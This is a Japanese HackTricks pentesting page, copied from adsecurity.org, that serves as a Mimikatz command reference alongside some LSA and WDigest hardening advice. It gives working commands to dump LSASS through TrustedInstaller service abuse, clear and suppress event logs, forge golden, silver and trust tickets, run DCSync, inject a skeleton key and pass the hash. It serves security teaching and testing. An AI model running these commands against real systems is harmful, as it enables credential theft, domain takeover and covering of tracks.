# Mimikatz

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで企業を宣伝**してみたいですか？または、**最新バージョンのPEASSにアクセス**したいですか？または、HackTricksを**PDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、独占的な[NFTs](https://opensea.io/collection/the-peass-family)のコレクション
* [**公式PEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で**🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)を**フォロー**してください。
* **ハッキングトリックを共有するには、**[**hacktricksリポジトリ**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloudリポジトリ**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出してください。**

</details>

このページの内容は[adsecurity.org](https://adsecurity.org/?page\_id=1821)からコピーされました

## メモリ内のLMハッシュとクリアテキスト

Windows 8.1およびWindows Server 2012 R2から、LMハッシュと「クリアテキスト」パスワードはもはやメモリにありません。

LSASSに「クリアテキスト」パスワードが配置されるのを防ぐために、次のレジストリキーを「0」（ダイジェスト無効）に設定する必要があります：

_HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest “UseLogonCredential”(DWORD)_

## **Mimikatz＆LSA保護:**

Windows Server 2012 R2およびWindows 8.1には、LSA保護と呼ばれる新機能が含まれており、[Windows Server 2012 R2のLSASSを保護プロセスとして有効にする](https://technet.microsoft.com/en-us/library/dn408187.aspx)（Mimikatzはドライバーでバイパスできますが、それによりイベントログにいくつかのノイズが発生する可能性があります）：

_LSAには、ローカルおよびリモートのサインインのユーザーを検証し、ローカルのセキュリティポリシーを強制するローカルセキュリティ権限サーバーサービス（LSASS）プロセスが含まれています。 Windows 8.1オペレーティングシステムは、非保護プロセスによるメモリの読み取りとコードインジェクションを防ぐためにLSAに追加の保護を提供します。これにより、LSAが保存および管理する資格情報に追加のセキュリティが提供されます。_

LSA保護を有効にする方法：

1. レジストリエディタ（RegEdit.exe）を開き、次のレジストリキーに移動します：HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa およびレジストリキーの値を次のように設定します：「RunAsPPL」=dword:00000001。
2. 新しいGPOを作成し、コンピューター構成、設定、Windows設定に移動します。 レジストリを右クリックし、新規を指定して、レジストリ項目をクリックします。 新しいレジストリプロパティダイアログボックスが表示されます。 HiveリストでHKEY\_LOCAL\_MACHINEをクリックします。 キー パスリストで、SYSTEM\CurrentControlSet\Control\Lsa に移動します。 値名ボックスにRunAsPPLと入力します。 値の種類ボックスでREG\_DWORDをクリックします。 値データボックスに00000001と入力します。OKをクリックします。

LSA保護により、非保護プロセスがLSASSとやり取りするのを防ぎます。 Mimikatzはまだこのドライバー（“!+”）でこれをバイパスできます。

[![Mimikatz-Driver-Remove-LSASS-Protection](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Driver-Remove-LSASS-Protection.jpg)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Driver-Remove-LSASS-Protection.jpg)

### 無効化されたSeDebugPrivilegeのバイパス
デフォルトでは、SeDebugPrivilegeは管理者グループにローカルセキュリティポリシーを介して付与されます。 Active Directory環境では、[この特権を削除](https://medium.com/blue-team/preventing-mimikatz-attacks-ed283e7ebdd5)することが可能で、Computer Configuration --> Policies --> Windows Settings --> Security Settings --> Local Policies --> User Rights Assignment --> Debug programsを空のグループとして定義します。 オフラインのAD接続デバイスでも、この設定は上書きできず、ローカル管理者はメモリのダンプやMimikatzの使用を試みるとエラーが発生します。

ただし、TrustedInstallerアカウントは引き続きメモリのダンプにアクセスでき、[この防御をバイパスするために使用できます](https://www.pepperclipp.com/other-articles/dump-lsass-when-debug-privilege-is-disabled)。 TrustedInstallerサービスの構成を変更することで、アカウントを実行してProcDumpを使用し、`lsass.exe`のメモリをダンプすることができます。
```
sc config TrustedInstaller binPath= "C:\Users\Public\procdump64.exe -accepteula -ma lsass.exe C:\Users\Public\lsass.dmp"
sc start TrustedInstaller
```
[![TrustedInstaller-Dump-Lsass](https://1860093151-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-M6yZUYP7DLMbZuztKpV%2Fuploads%2FJtprjloNPADNSpb6S0DS%2Fimage.png?alt=media&token=9b639459-bd4c-4897-90af-8990125fa058)

このダンプファイルは、攻撃者が制御するコンピュータに外部流出させ、そこから資格情報を抽出することができます。
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## メイン

### **イベント**

**EVENT::Clear** – イベントログをクリアする\
[\
![Mimikatz-Event-Clear](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Event-Clear.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Event-Clear.png)

**EVENT:::Drop** – (_**実験的**_) 新しいイベントを避けるためにイベントサービスをパッチする

[![Mimikatz-Event-Drop](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Event-Drop.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Event-Drop.png)

注意:\
privilege::debug を実行してから event::drop を実行してイベントログをパッチします。その後、Event::Clear を実行してイベントログをクリアしますが、クリアされたイベント (1102) が記録されません。

### KERBEROS

#### ゴールデンチケット

ゴールデンチケットは、KRBTGT NTLMパスワードハッシュを使用して暗号化および署名されたTGTです。

ゴールデンチケット（GT）は、ドメイン内の任意のユーザー（実在するか想像上の）を任意のグループのメンバーとして（実質的に無制限の権限を提供する）ドメイン内の任意のリソースに対して偽装するために作成できます。

**Mimikatzゴールデンチケットコマンドリファレンス:**

ゴールデンチケットを作成するMimikatzコマンドは「kerberos::golden」です。

* /domain – 完全修飾ドメイン名。この例では「lab.adsecurity.org」です。
* /sid – ドメインのSID。この例では「S-1-5-21-1473643419-774954089-2222329127」です。
* /sids – スプーフしたいADフォレスト内のアカウント/グループに権限がある追加のSID。通常、これはルートドメインのEnterprise Adminsグループである「S-1-5-21-1473643419-774954089-5872329127-519」です。[このパラメータは提供されたSIDをSID Historyパラメータに追加します。](https://adsecurity.org/?p=1640)
* /user – 偽装するユーザー名
* /groups (オプション) – ユーザーがメンバーであるグループRID（最初のものがプライマリグループです）。\
同じアクセスを受け取るためにユーザーまたはコンピューターアカウントRIDを追加します。\
デフォルトグループ: 513,512,520,518,519 は、よく知られた管理者グループのグループです（以下にリストされています）。
* /krbtgt – ドメインKDCサービスアカウント（KRBTGT）のNTLMパスワードハッシュ。TGTを暗号化および署名するために使用されます。
* /ticket (オプション) – 後で使用するためにゴールデンチケットファイルを保存するパスと名前を指定するか、/ptt を使用して即座にメモリにゴールデンチケットを注入します。
* /ptt – /ticket の代替として – これを使用して偽造されたチケットを即座にメモリに注入して使用します。
* /id (オプション) – ユーザーRID。Mimikatzのデフォルトは500です（デフォルトの管理者アカウントRID）。
* /startoffset (オプション) – チケットが利用可能になる開始オフセット（通常は使用する場合には-10または0に設定）。Mimikatzのデフォルト値は0です。
* /endin (オプション) – チケットの有効期間。Mimikatzのデフォルト値は10年（約5,262,480分）です。Active DirectoryのデフォルトのKerberosポリシー設定は10時間（600分）です。
* /renewmax (オプション) – 更新とともにチケットの最大有効期間。Mimikatzのデフォルト値は10年（約5,262,480分）です。Active DirectoryのデフォルトのKerberosポリシー設定は7日間（10,080分）です。
* /sids (オプション) – ADフォレスト内のEnterprise AdminsグループのSID（\[ADRootDomainSID]-519）を設定して、ADフォレスト全体でEnterprise Admin権限をスプーフィングします（ADフォレスト内のすべてのドメインでAD管理者）。
* /aes128 – AES128キー
* /aes256 – AES256キー

ゴールデンチケットのデフォルトグループ:

* ドメインユーザーSID: S-1-5-21\<DOMAINID>-513
* ドメイン管理者SID: S-1-5-21\<DOMAINID>-512
* スキーマ管理者SID: S-1-5-21\<DOMAINID>-518
* Enterprise Admins SID: S-1-5-21\<DOMAINID>-519（これは偽造されたチケットがフォレストルートドメインで作成された場合にのみ有効ですが、ADフォレスト管理者権限を追加するには/sidsパラメータを使用します）
* グループポリシー作成者所有者SID: S-1-5-21\<DOMAINID>-520
```
.\mimikatz "kerberos::golden /User:Administrator /domain:rd.lab.adsecurity.org /id:512 /sid:S-1-5-21-135380161-102191138-581311202 /krbtgt:13026055d01f235d67634e109da03321 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt" exit
```
[他のドメイン間でのゴールデンチケット](https://adsecurity.org/?p=1640)

#### シルバーチケット

シルバーチケットは、ターゲットサービスアカウントの（SPNマッピングによって識別される）NTLMパスワードハッシュを使用して暗号化および署名されたTGS（TGTと同様の形式）です。

**シルバーチケットを作成するためのMimikatzコマンドの例:**

以下のMimikatzコマンドは、サーバーadsmswin2k8r2.lab.adsecurity.orgのCIFSサービス用のシルバーチケットを作成します。このシルバーチケットを正常に作成するには、adsmswin2k8r2.lab.adsecurity.orgのADコンピューターアカウントのパスワードハッシュを発見する必要があります。これは、ADドメインのダンプから取得するか、上記のようにローカルシステムでMimikatzを実行して取得することができます（_Mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit_）。NTLMパスワードハッシュは/rc4パラメータと共に使用されます。サービスSPNタイプも/serviceパラメータで特定する必要があります。最後に、ターゲットコンピューターの完全修飾ドメイン名を/targetパラメータで指定する必要があります。/sidパラメータにはドメインSIDを忘れないでください。
```
mimikatz “kerberos::golden /admin:LukeSkywalker /id:1106 /domain:lab.adsecurity.org /sid:S-1-5-21-1473643419-774954089-2222329127 /target:adsmswin2k8r2.lab.adsecurity.org /rc4:d7e2b80507ea074ad59f152a1ba20458 /service:cifs /ptt” exit
```
#### [**Trust Ticket**](https://adsecurity.org/?p=1588)

Active Directoryの信頼パスワードハッシュが判明すると、信頼チケットを生成できます。信頼チケットは、互いに信頼する2つのドメイン間で共有されるパスワードを使用して作成されます。\
[信頼チケットの詳細についてはこちら。](https://adsecurity.org/?p=1588)

**信頼パスワード（信頼キー）のダンプ**
```
Mimikatz “privilege::debug” “lsadump::trust /patch” exit
```
**Mimikatzを使用して偽の信頼チケット（異なる領域のTGT）を作成する**

Mimikatzを使用して、信頼チケットを偽造し、チケット保持者がAD Forest内のEnterprise Adminであるとする。これにより、子ドメインから親ドメインへの完全な管理アクセスが可能となる（Mimikatz内の信頼間でのSIDHistory、"sids"を活用）。このアカウントは実際にはどこにも存在する必要はなく、実質的には信頼を超えたGolden Ticketとなる。
```
Mimikatz “Kerberos::golden /domain:child.lab.adsecurity.org /sid:S-1-5-21-3677078698-724690114-1972670770 /sids:S-1-5-21-1581655573-3923512380-696647894-519 /rc4:49ed1653275f78846ff06de1a02386fd /user:DarthVader /service:krbtgt /target:lab.adsecurity.org /ticket:c:\temp\tickets\EA-ADSECLABCHILD.kirbi” exit
```
### 信頼チケットの特定必須パラメータ:

- \*\*/\*\*target – ターゲットドメインのFQDN。
- \*\*/\*\*service – ターゲットドメインで実行されているkerberosサービス (krbtgt)。
- \*\*/\*\*rc4 – サービスkerberosサービスアカウント (krbtgt) のNTLMハッシュ。
- \*\*/\*\*ticket – 作成したチケットファイルを後で使用するために保存するパスと名前を指定するか、/pttを使用してゴールデンチケットを即座にメモリに注入して使用する。

#### **KERBEROSの詳細**

**KERBEROS::List** – ユーザーメモリ内のすべてのユーザーチケット（TGTおよびTGS）をリストします。現在のユーザーのチケットのみ表示されるため、特別な特権は必要ありません。\
「klist」と同様の機能。

**KERBEROS::PTC** – キャッシュを渡す（NT6）\
Mac OS、Linux、BSD、Unixなどの*Nixシステムは、Kerberos資格情報をキャッシュします。このキャッシュされたデータはMimikatzを使用してコピーして渡すことができます。ccacheファイルにKerberosチケットを注入するのにも便利です。

Mimikatzのkerberos::ptcの良い例は、[PyKEKを使用したMS14-068の攻撃](https://adsecurity.org/?p=676)です。PyKEKはccacheファイルを生成し、それをkerberos::ptcを使用してMimikatzに注入できます。

**KERBEROS::PTT** – チケットを渡す\
[Kerberosチケットが見つかった後](https://adsecurity.org/?p=1667)、別のシステムにコピーして現在のセッションに渡すことで、ドメインコントローラーとの通信なしにログオンをシミュレートできます。特別な権限は必要ありません。\
SEKURLSA::PTH（Pass-The-Hash）に類似。

- /filename – チケットのファイル名（複数可）
- /diretory – ディレクトリパス、内部のすべての.kirbiファイルが注入されます。

**KERBEROS::Purge** – すべてのKerberosチケットを削除します\
「klist purge」の機能に類似。チケット（PTC、PTTなど）を渡す前にこのコマンドを実行して、正しいユーザーコンテキストが使用されることを確認します。

**KERBEROS::TGT** – 現在のユーザーの現在のTGTを取得します。

### LSADUMP

**LSADUMP**::**DCShadow** – 現在のマシンをDCとして設定し、DC内で新しいオブジェクトを作成できるようにします（持続的な方法）。\
これには完全なAD管理者権限またはKRBTGTパスワードハッシュが必要です。\
DCShadowは一時的にコンピュータをレプリケーションの目的で「DC」に設定します。

- ADフォレスト構成パーティションに2つのオブジェクトを作成します。
- 使用されるコンピュータのSPNを更新して、「GC」（グローバルカタログ）と「E3514235-4B06-11D1-AB04-00C04FC2DCD2」（ADレプリケーション）を含めます。Kerberosサービスプリンシパル名に関する詳細は[ADSecurity SPNセクション](https://adsecurity.org/?page\_id=183)を参照してください。
- DrsReplicaAddとKCCを介して更新をDCにプッシュします。
- 構成パーティションから作成されたオブジェクトを削除します。

**LSADUMP::DCSync** – DCにオブジェクトの同期を要求してパスワードデータを取得します\
[ドメイン管理者、ドメイン管理者、またはカスタムデリゲーションのメンバーシップが必要です。](https://adsecurity.org/?p=1729)

2015年8月にMimkatzに追加された主要な機能は、「DCSync」であり、効果的にドメインコントローラーを「偽装」し、対象のドメインコントローラーからアカウントのパスワードデータを要求します。

**DCSyncオプション:**

- /all – ドメイン全体のデータをDCSyncで取得します。
- /user – データを取得したいユーザーのユーザーIDまたはSID。
- /domain（オプション） – Active DirectoryドメインのFQDN。Mimikatzは接続するためにドメイン内のDCを検出します。このパラメータが提供されていない場合、Mimikatzは現在のドメインをデフォルトにします。
- /csv – csvにエクスポート
- /dc（オプション） – DCSyncが接続してデータを収集するドメインコントローラーを指定します。

/guidパラメータもあります。

**DCSyncコマンドの例:**

rd.adsecurity.orgドメインのKRBTGTユーザーアカウントのパスワードデータを取得する:\
_Mimikatz “lsadump::dcsync /domain:rd.adsecurity.org /user:krbtgt” exit_

rd.adsecurity.orgドメインの管理者ユーザーアカウントのパスワードデータを取得する:\
_Mimikatz “lsadump::dcsync /domain:rd.adsecurity.org /user:Administrator” exit_

lab.adsecurity.orgドメインのADSDC03ドメインコントローラーコンピュータアカウントのパスワードデータを取得する:\
_Mimikatz “lsadump::dcsync /domain:lab.adsecurity.org /user:adsdc03$” exit_

**LSADUMP::LSA** – LSAサーバーにSAM/ADエンタープライズを取得するように要求します（通常、パッチを即座に適用するか、インジェクトします）。データのサブセットには/patchを使用し、すべてを取得するには/injectを使用します。_システムまたはデバッグ権限が必要です。_

- /inject – 資格情報を抽出するためにLSASSをインジェクトします
- /name – 対象ユーザーアカウントのアカウント名
- /id – 対象ユーザーアカウントのRID
- /patch – LSASSをパッチします。

サービスアカウントはしばしばDomain Admins（または同等）のメンバーであるか、最近Domain Adminがコンピュータにログオンしている場合、攻撃者はその資格情報をダンプできます。これらの資格情報を使用すると、攻撃者はドメインコントローラーにアクセスし、KRBTGTアカウントのNTLMハッシュを含むすべてのドメイン資格情報を取得できます。
```
mimikatz lsadump::lsa /inject exit
```
**LSADUMP::NetSync**

NetSyncは、DCコンピューターアカウントのパスワードデータを使用して、シルバーチケットを介してドメインコントローラーになりすまし、DCSyncを使用してターゲットアカウントの情報（パスワードデータを含む）を取得する簡単な方法を提供します。

**LSADUMP::SAM** – SAMエントリを復号化するためのSysKeyを取得します（レジストリまたはハイブから）。SAMオプションは、ローカルセキュリティアカウントマネージャー（SAM）データベースに接続し、ローカルアカウントの資格情報をダンプします。

**LSADUMP::Secrets** – SECRETSエントリを復号化するためのSysKeyを取得します（レジストリまたはハイブから）。

**LSADUMP::SetNTLM** – サーバーに対して1つのユーザーの新しいパスワード/NTLMを設定するように要求します。

[**LSADUMP::Trust**](https://adsecurity.org/?p=1588) – LSAサーバーに信頼認証情報（通常またはフライ上のパッチ）を取得するように要求します。

### MISC

[**MISC::Skeleton**](https://adsecurity.org/?p=1275) – ドメインコントローラーのLSASSプロセスにスケルトンキーをインジェクトします。
```
"privilege::debug" "misc::skeleton"
```
### 特権

**PRIVILEGE::Backup** – バックアップ特権/権限を取得します。デバッグ権限が必要です。

**PRIVILEGE::Debug** – デバッグ権限を取得します（これまたはローカルシステム権限は、多くのMimikatzコマンドで必要です）。

### SEKURLSA

**SEKURLSA::Credman** – 資格情報マネージャーをリスト表示

**SEKURLSA::Ekeys** – **Kerberos暗号化キー**をリスト表示

**SEKURLSA::Kerberos** – 認証されたすべてのユーザー（サービスおよびコンピューターアカウントを含む）のKerberos資格情報をリスト表示

**SEKURLSA::Krbtgt** – ドメインKerberosサービスアカウント（KRBTGT）のパスワードデータを取得

**SEKURLSA::SSP** – SSP資格情報をリスト表示

**SEKURLSA::Wdigest** – WDigest資格情報をリスト表示

**SEKURLSA::LogonPasswords** – 利用可能なすべてのプロバイダー資格情報をリスト表示します。通常、最近ログオンしたユーザーおよびコンピューターの資格情報が表示されます。

* 現在ログオンしている（または最近ログオンした）アカウントおよびユーザー資格情報のコンテキストで実行されているサービスのパスワードデータをダンプします。
* アカウントのパスワードは逆転可能な方法でメモリに保存されています。メモリに保存されている場合（Windows 8.1/Windows Server 2012 R2以前は保存されていました）、表示されます。Windows 8.1/Windows Server 2012 R2では、ほとんどの場合、アカウントのパスワードはこの方法で保存されません。KB2871997は、Windows 7、Windows 8、Windows Server 2008R2、およびWindows Server 2012にこのセキュリティ機能を「後方移植」しますが、KB2871997を適用した後、コンピューターに追加の構成が必要です。
* 管理者アクセス（デバッグ権限を持つ）またはローカルSYSTEM権限が必要です

**SEKURLSA::Minidump** – LSASSミニダンププロセスコンテキストに切り替えます（lsassダンプを読み取り）

**SEKURLSA::Pth** – ハッシュ渡しとオーバーパスハッシュ（別名：鍵の渡し）。

_Mimikatzは、NTLMハッシュを使用してプロセスを別の資格情報で実行するよく知られた操作「ハッシュ渡し」を実行できます。これにより、偽のアイデンティティでプロセスを開始し、その後、偽の情報（偽のパスワードのNTLMハッシュ）を実際の情報（実際のパスワードのNTLMハッシュ）に置き換えます。_

* /user – 擬似化したいユーザー名。管理者がこのよく知られたアカウントの唯一の名前ではないことに注意してください。
* /domain – 完全修飾ドメイン名 – ドメインがない場合やローカルユーザー/管理者の場合は、コンピューター名、サーバー名、ワークグループなどを使用します。
* /rc4または/ntlm – オプション – ユーザーのパスワードのRC4キー/NTLMハッシュ。
* /run – オプション – 実行するコマンドライン – デフォルトは: シェルを持つためのcmd。

[![Mimikatz-Sekurlsa-PTH](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-PTH.jpg)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-PTH.jpg)

**SEKURLSA::Tickets** – 最近認証されたすべてのユーザー、ユーザーアカウントのコンテキストで実行されているサービス、およびローカルコンピューターのADコンピューターアカウントの利用可能なすべてのKerberosチケットをリスト表示します。\
kerberos::listとは異なり、sekurlsaはメモリ読み取りを使用し、キーのエクスポート制限の対象外です。sekurlsaは他のセッション（ユーザー）のチケットにアクセスできます。

* /export – オプション – チケットは.kirbiファイルにエクスポートされます。ユーザーのLUIDとグループ番号（0 = TGS、1 = クライアントチケット(?)、2 = TGT）で始まります。

LSASSからの資格情報ダンプと同様に、sekurlsaモジュールを使用すると、システム上のすべてのKerberosチケットデータを取得できます。これには、管理者またはサービスに属するものも含まれます。\
これは、ユーザーがバックエンドSQLサーバーにアクセスするために使用するKerberos委任が構成されたWebサーバーを攻撃者が侵害した場合に非常に役立ちます。これにより、攻撃者はそのサーバーのメモリ内のすべてのユーザーチケットをキャプチャして再利用できます。

“kerberos::tickets” mimikatzコマンドは、現在ログオンしているユーザーのKerberosチケットをダンプし、昇格権限は必要ありません。保護されたメモリ（LSASS）から読み取る能力を活用するsekurlsaモジュールを使用すると、システム上のすべてのKerberosチケットをダンプできます。

コマンド: _mimikatz sekurlsa::tickets exit_

* システム上のすべての認証されたKerberosチケットをダンプします。
* 管理者アクセス（デバッグ権限を持つ）またはローカルSYSTEM権限が必要です

### **SID**

Mimikatz SIDモジュールはMISC::AddSIDを置き換えます。NTDSサービスをパッチするにはSID::Patchを使用します。

**SID::add** – オブジェクトのSIDHistoryにSIDを追加

[![Mimikatz-SID-add](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-add.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-add.png)

**SID::modify** – オブジェクトのSIDを変更

[![Mimikatz-SID-Modify](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-Modify.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-Modify.png)

### **TOKEN**

Mimikatz Tokenモジュールを使用すると、MimikatzはWindows認証トークンとのやり取りを行うことができます。既存のトークンを取得および擬似化することができます。

**TOKEN::Elevate** – トークンを擬似化します。権限をSYSTEM（デフォルト）に昇格させるか、Windows APIを使用してボックス上でドメイン管理者トークンを見つけます。\
_管理者権限が必要です。_

[![Mimikatz-Token-Elevate1](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Elevate1-1.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Elevate1-1.png)

ボックス上でドメイン管理者の資格情報を見つけ、そのトークンを使用します: _token::elevate /domainadmin_

[![Mimikatz-Token-Elevate-DomainAdmin](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Elevate-DomainAdmin.jpg)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Elevate-DomainAdmin.jpg)

**TOKEN::List** – システムのすべてのトークンをリスト表示

### **TS**

**TS::MultiRDP** – （実験的）複数のユーザーを許可するためにターミナルサーバーサービスをパッチします

[![Mimikatz-TS-MultiRDP](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-TS-MultiRDP.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-TS-MultiRDP.png)

**TS::Sessions** – TS/RDPセッションをリスト表示します。

![](https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-TS-Sessions.png)

### Vault

`mimikatz.exe "privilege::debug" "token::elevate" "vault::cred /patch" "exit"` - スケジュールされたタスクのパスワードを取得します
